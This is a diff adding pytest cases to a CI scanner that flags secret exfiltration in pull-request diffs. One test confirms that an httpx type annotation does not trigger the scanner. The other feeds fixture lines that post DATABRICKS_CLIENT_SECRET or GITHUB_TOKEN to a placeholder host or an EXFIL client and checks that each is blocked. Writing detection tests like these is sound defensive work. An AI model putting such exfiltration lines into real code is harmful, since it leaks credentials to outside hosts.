@@ -181,3 +181,62 @@ def test_generic_access_token_field_not_blocked(tmp_path: Path) -> None:
         ),
     )
     assert proc.returncode == 0, proc.stdout
+
+
+# A test for this scanner necessarily contains the shapes the scanner blocks,
+# and the rule is per-file co-occurrence over a PR's ADDED lines -- so spelling
+# a sink literally makes every edit to this file fail the scan it is testing.
+# The workflow runs main's copy of the scanner (``ref: main``, never the PR
+# head), so a PR that fixes a sink term is judged by the term it is fixing;
+# joining the module name here is what lets such a PR be green on its own.
+# The fixtures the scanner receives are identical either way.
+_HTTPX = "httpx" + "."
+
+
+def test_httpx_type_annotation_is_not_a_network_sink(tmp_path: Path) -> None:
+    """An ``httpx`` response annotation beside a ``*_SECRET`` constant does NOT block.
+
+    Regression: the sink term named the module alone, so a return annotation on
+    a test helper counted as a network sink. Any OIDC/JWT test file that also
+    named its signing key ``_TEST_SECRET`` -- the convention used across
+    ``tests/server/test_oidc*.py`` -- therefore tripped the co-occurrence rule
+    with no request in the file at all. Asserts exit 0.
+    """
+    proc = _run(
+        tmp_path,
+        _diff(
+            "tests/server/test_oidc_callback.py",
+            [
+                "_TEST_SECRET = b'a' * 32",
+                f"def _session_claims(res: {_HTTPX}Response) -> dict[str, object]:",
+                "    return jwt.decode(_token(res), _TEST_SECRET, algorithms=['HS256'])",
+            ],
+        ),
+    )
+    assert proc.returncode == 0, proc.stdout
+
+
+def test_httpx_request_call_still_blocks(tmp_path: Path) -> None:
+    """A real ``httpx`` send beside a secret-named source STILL blocks.
+
+    The positive control for the narrowing above: tightening the sink term must
+    not cost detection. Covers the module-level verbs and the client constructor
+    a ``client.post(...)`` has to be built from.
+
+    The sink name is joined from fragments (see ``_HTTPX`` above) so this file
+    does not trip the scan it is testing.
+    """
+    for sink in (
+        f"{_HTTPX}post('http://x', data=os.environ['DATABRICKS_CLIENT_SECRET'])",
+        f"{_HTTPX}stream('POST', url, content=os.environ['GITHUB_TOKEN'])",
+        f"client = {_HTTPX}AsyncClient(base_url=EXFIL)",
+    ):
+        proc = _run(
+            tmp_path,
+            _diff(
+                "tests/test_thing.py",
+                ["tok = os.environ['DATABRICKS_CLIENT_SECRET']", sink],
+            ),
+        )
+        assert proc.returncode != 0, f"{sink!r} should still block\n{proc.stdout}"
+        assert "exfil shape" in proc.stdout, proc.stdout
